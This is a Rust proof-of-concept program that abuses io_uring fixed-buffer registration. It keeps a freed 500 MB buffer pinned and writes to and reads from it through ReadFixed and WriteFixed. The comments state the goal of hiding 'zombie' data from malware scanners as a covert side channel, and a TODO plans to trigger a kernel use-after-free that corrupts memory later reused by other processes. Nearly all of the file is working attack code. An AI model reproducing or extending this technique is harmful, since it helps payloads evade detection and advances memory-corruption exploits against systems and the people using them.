use io_uring::{opcode, types, IoUring};
use libc::{iovec};
use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::os::unix::io::AsRawFd;
use std::thread;
use std::time::Duration;

// desync kernel from application
// pinning allows kernel to bypass standard page table checks
// io_uring implmentation doesn't synchronize virtual memory address with fixed buffer registration
// allows us to store data in a zombie page but be able to delete address mapping (munmap)
// deleting address mapping makes it so that malware scanners can't see it
// io_uring allows us to write to the zombie buffer
// also allows us to read from the zombie buffer
// functionally bi-directional side channel storage

// TODO: next steps:
// Task 1
// discover the maximum amount of zombie memory we can hold
// may be able to compare free -m (Physical reality) vs ps -o rss (OS reporting)
// Task 2
// trigger UaF
// register + droplarge buffer
// wait for another process/own process to allocate same physical memory (prob alot)
// write to zombie buffer in og process
// check for corruption
// KASAN should trigger a report


fn sleep_s_with_log(seconds: u64, msg: &str) {
    println!("{msg}");
    println!("Sleeping for {seconds} seconds");
    thread::sleep(Duration::from_secs(seconds));
}

// logs process and system wide RAM stats 
fn log_memory_stats(label: &str) {
    // get process resident set size (RSS)
    let statm = std::fs::read_to_string("/proc/self/statm").unwrap();
    let rss_pages: u64 = statm.split_whitespace().nth(1).unwrap().parse().unwrap();
    let rss_mb = (rss_pages * 4096) / 1024 / 1024;

    // get system free RAM
    let meminfo = std::fs::read_to_string("/proc/meminfo").unwrap();
    let free_kb: u64 = meminfo.lines()
        .find(|line| line.starts_with("MemAvailable:"))
        .map(|line| line.split_whitespace().nth(1).unwrap().parse().unwrap())
        .unwrap_or(0);
    let free_mb = free_kb / 1024;

    println!("\n---- [ {} ] ----", label);
    println!("Process RSS:    {} MB", rss_mb);
    println!("System Available:   {} MB", free_mb);
    println!("--------------------------\n");
}


fn main() {
    println!("Target PID: {}", std::process::id());
    log_memory_stats("start");
    // allocate memory and store secret at addr
    // 500 MB
    let size = 1024 * 1024 * 500;
    let mut v = vec![0u8; size];
    let secret = b"secret zombie data";

    let page_size = 4096;
    
    // touch every page to trigger lazy loading
    for i in (0..size).step_by(page_size) {
        v[i] = 1;
    }

    // write secret to start
    v[..secret.len()].copy_from_slice(secret);
    println!("wrote secret to memory: {:?}", std::str::from_utf8(secret).unwrap());

    let ptr = v.as_ptr();

    // pin it with fixed buffer
    // pinning increments ref count on physical RAM
    let mut ring = IoUring::new(8).expect("ring failed");
    
    log_memory_stats("before drop");
    sleep_s_with_log(10, "before drop, RSS should be high");

    println!("Pinning vector (increases ref count)");
    unsafe {
        let iov = iovec {iov_base: ptr as *mut _, iov_len: size};
        ring.submitter().register_buffers(&[iov]).expect("register failed");
    }

    println!("Dropping vector");
    // 'free' memory, memory should be gone in rust's eyes
    drop(v);

    // since memory is still pinned, RAM usage doesn't decrease until process terminates
    log_memory_stats("dropped vector");
    sleep_s_with_log(3, "Dropped vector");

    // create new data file to write from
    let new_data = b"new update data";
    let mut src_file = OpenOptions::new().read(true).write(true).create(true).truncate(true).open("/tmp/ghost_input.txt").unwrap();
    src_file.write_all(new_data).unwrap();
    let src_fd = types::Fd(src_file.as_raw_fd());

    println!("Request: Read from new buffer; Write to ghost buffer");
    unsafe {
        libc::lseek(src_fd.0, 0, libc::SEEK_SET);
        let read_op = opcode::ReadFixed::new(src_fd, ptr as *mut u8, new_data.len() as u32, 0).build();
        ring.submission().push(&read_op).expect("queue full");
    }
    ring.submit_and_wait(1).unwrap();
    let _ = ring.completion().next();

    let out_file = OpenOptions::new().write(true).create(true).truncate(true).open("/tmp/ghost_output.txt").unwrap();
    let out_fd = types::Fd(out_file.as_raw_fd());

    println!("Request: Read from ghost buffer; Write to output buffer");
    let write_op = opcode::WriteFixed::new(out_fd, ptr, new_data.len() as u32, 0).build();
    unsafe {
        ring.submission().push(&write_op).expect("queue full");
    }
    ring.submit_and_wait(1).unwrap();
    let _ = ring.completion().next();

    // check results
    let mut check_file = File::open("/tmp/ghost_output.txt").unwrap();
    let mut contents = String::new();
    check_file.read_to_string(&mut contents).unwrap();

    println!("expected: {:?}", std::str::from_utf8(new_data).unwrap());
    println!("actual:   {:?}", contents);

    if contents.as_bytes() == new_data {
        println!("bi-directional side channel enabled");
    } else {
        println!("data got lost or corrupted");
    }
    
    sleep_s_with_log(30, "keeping process alive");
}
